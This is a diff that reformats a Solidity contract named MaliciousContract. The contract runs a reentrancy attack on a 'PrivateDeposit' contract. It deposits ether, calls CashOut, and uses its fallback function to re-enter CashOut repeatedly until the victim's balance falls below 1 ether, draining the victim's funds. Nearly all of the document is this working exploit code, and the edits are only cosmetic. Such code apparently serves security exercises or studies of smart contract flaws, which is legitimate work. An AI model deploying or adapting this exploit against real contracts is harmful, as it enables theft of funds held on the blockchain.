@@ -9,21 +9,18 @@ contract MaliciousContract {
         privateDeposit = PrivateDeposit(_victimAddress);
     }
 
-    function attack(uint amount) public  {
+    function attack(uint256 amount) public {
         privateDeposit.CashOut(amount);
-
     }
-    function deposit() public payable{
+    function deposit() public payable {
         require(msg.value >= 1 ether, "Must send at least 1 ether");
         privateDeposit.Deposit.value(msg.value)();
     }
 
-    function() payable public {
+    function() public payable {
         // Re-enter the vulnerable function if there's still balance to collect
-        if ( address(privateDeposit).balance >= 1 ether) {
+        if (address(privateDeposit).balance >= 1 ether) {
             privateDeposit.CashOut(1 ether);
         }
     }
-
-
 }
